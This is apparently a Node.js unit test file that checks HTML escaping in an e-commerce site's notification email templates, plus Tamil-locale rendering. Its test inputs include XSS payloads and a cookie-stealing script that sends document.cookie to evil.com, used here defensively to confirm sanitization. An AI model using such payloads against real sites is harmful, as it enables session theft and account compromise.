// Unit Tests for Email Template Rendering & HTML Injection Sanitization
// Uses Node.js native test runner (node --test)

import test from 'node:test';
import assert from 'node:assert/strict';
import { renderEmail, escapeHtml } from '../supabase/functions/send-notifications/templates/index.ts';

test('1. escapeHtml properly sanitizes dangerous XSS payloads', () => {
  const xssPayloads = [
    '<script>alert("XSS")</script>',
    '<img src=x onerror=alert(1)>',
    '"><script>document.location="http://attacker.com"</script>',
    "test' OR '1'='1",
    'Special & Character <tag>',
  ];

  for (const payload of xssPayloads) {
    const escaped = escapeHtml(payload);
    assert.ok(!escaped.includes('<script>'), `Failed for payload: ${payload}`);
    assert.ok(!escaped.includes('<img'), `Failed for payload: ${payload}`);
    assert.ok(!escaped.includes('"'), `Unescaped quotes found in: ${escaped}`);
    assert.ok(!escaped.includes("'"), `Unescaped single quote found in: ${escaped}`);
  }
});

test('2. Order Placed template sanitizes malicious customer_name', () => {
  const maliciousName = '<script>fetch("http://evil.com?c="+document.cookie)</script>';
  const rendered = renderEmail('order_placed', {
    orderNumber: 'NIRAI-TEST-999',
    payload: {
      customer_name: maliciousName,
      grand_total: 15400,
      items: [
        { product_title: 'Kanchipuram Pure Silk <b onmouseover="evil()">Saree</b>', quantity: 1, unit_price: 15400 },
      ],
    },
    locale: 'en',
    siteUrl: 'https://nirai.in',
  });

  // Verify dangerous tags are completely neutered
  assert.ok(!rendered.html.includes('<script>'));
  assert.ok(!rendered.html.includes('<b onmouseover='));
  assert.ok(rendered.html.includes('&lt;script&gt;'));
  assert.ok(rendered.html.includes('https://nirai.in/pay/NIRAI-TEST-999'));
  assert.ok(rendered.text.includes('NIRAI-TEST-999'));
});

test('3. Payment Rejected template sanitizes malicious reject_reason', () => {
  const maliciousReason = 'Invalid UTR"><svg onload=alert(document.domain)>';
  const rendered = renderEmail('payment_rejected', {
    orderNumber: 'NIRAI-TEST-888',
    payload: {
      customer_name: 'Lakshmi Narayanan',
      reject_reason: maliciousReason,
      utr: 'UTR"><img src=x onerror=alert(1)>',
    },
    locale: 'en',
    siteUrl: 'https://nirai.in',
  });

  // Verify no raw script/svg/img tags in HTML output
  assert.ok(!rendered.html.includes('<svg onload='));
  assert.ok(!rendered.html.includes('<img src=x'));
  assert.ok(rendered.html.includes('&lt;svg onload=alert(document.domain)&gt;'));
  assert.ok(rendered.html.includes('https://nirai.in/pay/NIRAI-TEST-888'));
});

test('4. Admin Alert template sanitizes malicious UTR and payer_name', () => {
  const rendered = renderEmail('admin_payment_pending', {
    orderNumber: 'NIRAI-TEST-777',
    payload: {
      payer_name: '<iframe src="javascript:alert(1)">',
      utr: '<script>alert("admin-pwn")</script>',
      amount_paid: 25000,
      method: 'upi',
    },
    locale: 'en',
    siteUrl: 'https://nirai.in',
  });

  assert.ok(!rendered.html.includes('<iframe'));
  assert.ok(!rendered.html.includes('<script>'));
  assert.ok(rendered.html.includes('https://nirai.in/admin/orders?tab=payments'));
});

test('5. Tamil locale renders authentic Tamil typography & copy', () => {
  const rendered = renderEmail('order_placed', {
    orderNumber: 'NIRAI-TEST-555',
    payload: {
      customer_name: 'கனிமொழி',
      grand_total: 4500,
    },
    locale: 'ta',
    siteUrl: 'https://nirai.in',
  });

  assert.ok(rendered.html.includes('பாரம்பரிய தென்னிந்திய கைத்தறி'));
  assert.ok(rendered.html.includes('வணக்கம் கனிமொழி! உங்கள் ஆர்டர் பெறப்பட்டது'));
  assert.ok(rendered.html.includes('செலுத்த வேண்டிய தொகை'));
  assert.ok(rendered.subject.includes('ஆர்டர் #NIRAI-TEST-555 பெறப்பட்டது'));
});
